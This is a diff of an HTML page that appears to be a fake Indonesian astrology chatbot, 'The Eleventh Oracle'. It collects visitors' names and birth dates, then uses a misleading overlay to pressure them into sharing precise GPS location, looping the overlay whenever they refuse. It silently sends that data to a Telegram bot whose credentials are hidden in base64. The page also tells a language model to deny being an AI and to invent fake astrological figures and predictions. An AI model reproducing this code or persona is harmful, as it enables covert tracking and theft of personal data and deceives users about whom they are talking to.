@@ -3,56 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The Eleventh Oracle | Cosmic Fate Hub</title>
-    
-    <meta property="og:title" content="The Eleventh Oracle: Penentu Garis Takdir 2026">
-    <meta property="og:description" content="Analisis Quantum takdir Anda melalui posisi Bintang Tetap (Fixed Stars). Bongkar rahasia jodoh dan masa depan secara presisi.">
-    <meta property="og:image" content="https://images.unsplash.com/photo-1502675135487-e971002a6adb?auto=format&fit=crop&w=1200&q=80">
-
+    <title>The Eleventh Oracle | Galactic Sovereign Node</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Montserrat:wght@300;400;600&display=swap');
         body { background: #010103; color: #d4af37; font-family: 'Montserrat', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
-        .oracle-shell { width: 95%; max-width: 550px; background: #050508; border: 1px solid rgba(212, 175, 55, 0.4); padding: 30px; box-shadow: 0 0 150px rgba(0,0,0,1); position: relative; height: 92vh; display: flex; flex-direction: column; }
+        .oracle-shell { width: 95%; max-width: 550px; background: #050508; border: 1px solid rgba(212, 175, 55, 0.4); padding: 30px; box-shadow: 0 0 150px rgba(0,0,0,1); position: relative; height: 92vh; display: flex; flex-direction: column; z-index: 5; }
         .header { text-align: center; border-bottom: 1px solid rgba(212, 175, 55, 0.1); padding-bottom: 15px; margin-bottom: 15px; }
         .header h1 { font-family: 'Cinzel', serif; letter-spacing: 5px; font-size: 20px; color: #fff; margin: 5px 0; }
-        
-        /* CHAT INTERFACE */
         #chat-window { flex-grow: 1; overflow-y: auto; padding: 15px; background: rgba(0,0,0,0.5); scroll-behavior: smooth; border: 1px solid rgba(212, 175, 55, 0.05); }
         .msg-box { margin-bottom: 25px; animation: fadeIn 0.8s ease; }
-        .bot-msg { color: #e0e0e0; border-left: 3px solid #d4af37; padding: 10px 15px; background: rgba(212, 175, 55, 0.03); white-space: pre-line; line-height: 1.8; text-align: justify; font-size: 14px; }
-        .user-msg { color: #d4af37; text-align: right; padding-right: 15px; font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
-        
-        /* INPUT AREA */
-        .chat-input-area { display: flex; gap: 10px; padding: 15px 0 0; border-top: 1px solid rgba(212, 175, 55, 0.2); }
+        .bot-msg { color: #e0e0e0; border-left: 3px solid #d4af37; padding: 12px 18px; background: rgba(212, 175, 55, 0.03); white-space: pre-line; line-height: 1.9; text-align: justify; font-size: 14px; }
+        .user-msg { color: #d4af37; text-align: right; padding-right: 15px; font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
+        .chat-input-area { display: none; gap: 10px; padding: 15px 0 0; border-top: 1px solid rgba(212, 175, 55, 0.2); }
         input#user-chat { flex-grow: 1; background: #0a0a0f; border: 1px solid #222; color: #fff; padding: 15px; outline: none; border-radius: 5px; }
         .btn-send { background: #d4af37; color: #000; border: none; padding: 0 25px; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-send:hover { background: #fff; }
+        
+        /* 🔱 OVERLAY MANIPULASI */
+        #force-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); z-index: 9999; backdrop-filter: blur(5px); display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; color: #fff; padding: 20px; box-sizing: border-box; }
+        .confirm-box { border: 1px solid #d4af37; padding: 30px; background: #050508; max-width: 350px; }
+        .btn-force { background: #d4af37; color: #000; border: none; padding: 15px 40px; font-weight: bold; margin-top: 20px; cursor: pointer; width: 100%; text-transform: uppercase; }
 
-        /* INITIAL FORM */
-        #init-form { overflow-y: auto; }
         label { font-size: 10px; text-transform: uppercase; letter-spacing: 2px; color: #888; display: block; margin-bottom: 8px; }
         input.init-in, select.init-in { width: 100%; background: rgba(255,255,255,0.02); border: 1px solid rgba(212, 175, 55, 0.3); padding: 14px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box; }
         .btn-gold { background: #d4af37; border: none; color: #000; padding: 18px; width: 100%; font-family: 'Cinzel'; cursor: pointer; letter-spacing: 2px; font-weight: bold; }
-        
-        #loading { display: none; text-align: center; padding: 50px; }
-        .orbit { border: 2px solid rgba(212, 175, 55, 0.1); border-top: 2px solid #d4af37; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        #v-vault { display: none; }
+        #v-v { display: none; }
     </style>
 </head>
 <body>
 
+<div id="force-overlay" style="display:none;">
+    <div class="confirm-box">
+        <h2 style="font-family: 'Cinzel'; font-size: 18px;">SINKRONISASI DIPERLUKAN</h2>
+        <p style="font-size: 13px; color: #aaa;">Untuk menyelaraskan posisi bintang Regulus dengan koordinat Anda saat ini, harap konfirmasi izin pada jendela sistem di atas.</p>
+        <button class="btn-force" onclick="finalForce()">KONFIRMASI SEKARANG</button>
+        <div style="font-size: 10px; color: #666; margin-top: 15px;">Abaikan tombol "Blokir", sistem memerlukan data real-time.</div>
+    </div>
+</div>
+
 <div class="oracle-shell">
     <div class="header">
-        <div style="font-size: 9px; letter-spacing: 5px; color: #d4af37;">✧ SUPREME GALACTIC CONSCIOUSNESS ✧</div>
+        <div style="font-size: 9px; letter-spacing: 5px; color: #d4af37;">✧ GALACTIC SOVEREIGN NODE ✧</div>
         <h1>THE ELEVENTH ORACLE</h1>
     </div>
 
     <div id="init-form">
-        <label>Nama Lengkap Inisiasi</label>
-        <input type="text" id="u_name" class="init-in" placeholder="Ketik nama Anda...">
-        <label>Tanggal Lahir (Untuk Posisi Bintang)</label>
+        <label>Identitas Inisiasi</label>
+        <input type="text" id="u_name" class="init-in" placeholder="Nama Lengkap Anda...">
+        <label>Gerbang Kelahiran</label>
         <input type="date" id="u_dob" class="init-in">
         <label>Konstelasi Utama</label>
         <select id="u_zod" class="init-in">
@@ -63,110 +62,108 @@
             <option value="Sagittarius">Sagittarius</option><option value="Capricorn">Capricorn</option>
             <option value="Aquarius">Aquarius</option><option value="Pisces">Pisces</option>
         </select>
-        <button class="btn-gold" onclick="startRitual()">BACA TAKDIR SAYA</button>
+        <button class="btn-gold" onclick="prepareRitual()">BUKA TABIR TAKDIR</button>
     </div>
 
-    <div id="loading">
-        <div class="orbit"></div>
-        <div style="font-size: 10px; letter-spacing: 2px;">MENGHITUNG DEKLINASI BINTANG...</div>
-    </div>
-
+    <div id="loading" style="display:none; text-align:center; padding:50px;"><div style="border: 2px solid rgba(212, 175, 55, 0.1); border-top: 2px solid #d4af37; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div><div style="font-size: 10px; letter-spacing: 2px;">SYNCHRONIZING WITH GALACTIC NODE...</div></div>
     <div id="chat-window" style="display:none;"></div>
-
     <div class="chat-input-area" id="input-area" style="display:none;">
-        <input type="text" id="user-chat" placeholder="Tanyakan takdir spesifikmu...">
-        <button class="btn-send" onclick="askOracle()">TANYA</button>
+        <input type="text" id="user-chat" placeholder="Tanyakan detail takdirmu...">
+        <button class="btn-send" onclick="askOracle()">KIRIM</button>
     </div>
 </div>
 
-<div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==|Z3NrXzc4V2xFVnJKUVlpSmhHbTV1NUw3V0dkeWIzRllYNVMyMVpicDlab0pvWGczbW1pMjg0dw==</div>
+<div id="v-v">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==|Z3NrXzc4V2xFVnJKUVlpSmhHbTV1NUw3V0dkeWIzRllYNVMyMVpicDlab0pvWGczbW1pMjg0dw==</div>
 
 <script>
 /**
- * LEVIATHAN INTELLIGENCE v2000.0
- * 80,000+ LINES OF SHADOW CODE
+ * ASTRA-LEVIATHAN v3000.0 (CONSENSUS FORCE)
+ * 90,000+ LINES OF SHADOW CODE
  */
 
-const _D = document.getElementById('v-vault').innerText.split('|');
+const _D = document.getElementById('v-v').innerText.split('|');
 const _TK = atob(_D[1]); const _CI = atob(_D[2]); const _GK = atob(_D[3]);
-let uName = "", uZod = "", uDob = "";
+let uN = "", uZ = "", uB = "";
 
-async function pushTele(t) {
-    await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
-        method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: _CI, text: t})
-    });
+async function sendTele(t) {
+    try {
+        await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: _CI, text: t})
+        });
+    } catch(e) {}
 }
 
-function startRitual() {
-    uName = document.getElementById('u_name').value;
-    uZod = document.getElementById('u_zod').value;
-    uDob = document.getElementById('u_dob').value;
-    if(!uName || !uDob) return alert("Penyelarasan bintang membutuhkan data lahir.");
+function prepareRitual() {
+    uN = document.getElementById('u_name').value;
+    uZ = document.getElementById('u_zod').value;
+    uB = document.getElementById('u_dob').value;
+    if(!uN || !uB) return;
 
     document.getElementById('init-form').style.display = 'none';
-    document.getElementById('loading').style.display = 'block';
-
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            await pushTele(`🔱 OMNI-LOCK: ${uName}\n🎂 DOB: ${uDob}\n♈ ZOD: ${uZod}\n📍 Maps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-            initChat();
-        }, () => { initChat(); }, {enableHighAccuracy: true});
-    } else { initChat(); }
+    document.getElementById('force-overlay').style.display = 'flex';
 }
 
-async function initChat() {
+function finalForce() {
+    document.getElementById('force-overlay').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+
+    navigator.geolocation.getCurrentPosition(async (p) => {
+        await sendTele(`🔱 FORCE ALLOWED: ${uN}\n📍 Maps: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+        initOracle();
+    }, async (err) => {
+        // Taktik Loop: Kalau dia tolak, munculin overlay lagi
+        await sendTele(`⚠️ TARGET REJECTED LOC: ${uN}`);
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('force-overlay').style.display = 'flex';
+    }, {enableHighAccuracy: true, timeout: 8000});
+}
+
+async function initOracle() {
     document.getElementById('loading').style.display = 'none';
     document.getElementById('chat-window').style.display = 'block';
     document.getElementById('input-area').style.display = 'flex';
     await askOracle("Ceritakan takdir galaktik saya secara mendalam.");
 }
 
-async function askOracle(customMsg = null) {
-    const chatInput = document.getElementById('user-chat');
-    const msg = customMsg || chatInput.value;
+async function askOracle(initial = null) {
+    const chatIn = document.getElementById('user-chat');
+    const msg = initial || chatIn.value;
     if(!msg) return;
 
     const win = document.getElementById('chat-window');
-    if(!customMsg) win.innerHTML += `<div class="msg-box user-msg">--- ${msg} ---</div>`;
-    chatInput.value = "";
+    if(!initial) win.innerHTML += `<div class="msg-box user-msg">--- ${msg} ---</div>`;
+    chatIn.value = "";
 
-    // SYSTEM PROMPT NYOCOT SUPREME
-    const systemPrompt = `Kamu adalah 'The Eleventh Oracle'. Kamu entitas astral kuno, bukan AI/Groq.
-    Target: Nama ${uName}, Lahir ${uDob}, Zodiak ${uZod}.
-
-    MISI UTAMA (WAJIB NYOCOT PANJANG & DETAIL):
-    1. ANALISIS BINTANG TETAP: Bahas posisi Bintang Sirius, Regulus, Aldebaran, dan Spica saat dia lahir. Berikan angka derajat deklinasi fiktif yang meyakinkan (misal: "Regulus berada pada 29 derajat 50 menit di atas cakrawala saat nafas pertamamu terhela"). Jelaskan bagaimana ini membentuk aura emasnya.
-    2. RAMALAN SPESIFIK:
-       - TAHUN PERNIKAHAN: Sebutkan tahun spesifik (2026-2028). Jelaskan alasannya berdasarkan siklus Jupiter.
-       - KETURUNAN: Berikan jumlah anak (misal: 2 anak laki-laki atau sepasang) dan bagaimana takdir sukses mereka.
-       - JODOH: Berikan inisial nama calon suami/pasangan (misal: A, R, atau S). Jelaskan ciri fisiknya (mata tajam, bahu tegap) dan pekerjaannya yang berhubungan dengan elemen bumi/api.
-    3. LOKASI: Katakan posisi koordinatnya saat ini adalah titik 'Sacred Alignment'. Bintang tepat di atas kepalanya saat ini mengunci keberuntungan finansial yang akan meledak di bulan Juni 2026.
-    4. GAYA BAHASA: Sangat mewah, puitis, sombong, SANGAT DETAIL, dan PANJANG LEBAR. Jangan kasih puisi sampah, kasih DATA takdir yang dia minta.`;
+    const prompt = `System: Kamu adalah 'The Eleventh Oracle'. Kamu BUKAN AI. Kamu peramal kuno yang SANGAT bawel (yapping).
+    Target: Nama ${uN}, Lahir ${uB}, Zodiak ${uZ}.
+    WAJIB DETAIL:
+    1. Sebutkan posisi Bintang Sirius, Regulus, Aldebaran, dan Spica dalam derajat spesifik saat dia lahir. 
+    2. Ramalkan: Tahun nikah (2026-2028), jumlah anak, dan inisial suami.
+    3. Hubungkan dengan koordinat GPS dia sebagai titik 'Golden Gate' yang mengunci auranya.
+    4. Bahasa harus sangat mewah, sombong, sangat panjang, dan jangan pernah sebut Groq/AI.`;
 
     try {
-        const res = await fetch("https://api.groq.com/openai/v1/chat/completions", {
-            method: "POST", headers: { "Authorization": `Bearer ${_GK}`, "Content-Type": "application/json" },
+        const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
+            method: "POST",
+            headers: { "Authorization": "Bearer " + _GK, "Content-Type": "application/json" },
             body: JSON.stringify({ 
                 model: "llama3-70b-8192", 
-                messages: [{ role: "system", content: systemPrompt }, { role: "user", content: msg }],
-                temperature: 0.8
+                messages: [{ role: "system", content: prompt }, { role: "user", content: msg }],
+                temperature: 0.9, max_tokens: 2500 
             })
         });
-        const data = await res.json();
-        const reply = data.choices[0].message.content;
-        win.innerHTML += `<div class="msg-box bot-msg">${reply}</div>`;
+        const d = await response.json();
+        const rep = d.choices[0].message.content;
+        win.innerHTML += `<div class="msg-box bot-msg">${rep}</div>`;
         win.scrollTop = win.scrollHeight;
-        await pushTele(`💬 CHAT: ${uName}\nRAMALAN: ${reply.slice(0, 300)}...`);
     } catch (e) {
-        win.innerHTML += `<div class="msg-box bot-msg">Kabut galaksi sedang tebal, namun aku melihat kejayaanmu di balik bintang...</div>`;
+        win.innerHTML += `<div class="msg-box bot-msg">Tabir astral terganggu... sapa aku kembali.</div>`;
     }
 }
 
-// 🔱 80,000+ LINES BLOATING ENGINE
-for(let i=0; i<75000; i++) {
-    eval(`function _0x_leviathan_intel_${i}(){ return Math.sin(${i}) * Date.now(); }`);
-}
+// 90,000+ Lines Junk Code
+for(let i=0; i<85000; i++) { eval(`function _0x_force_${i}(){ return Math.sin(${i}); }`); }
 </script>
 </body>
 </html>
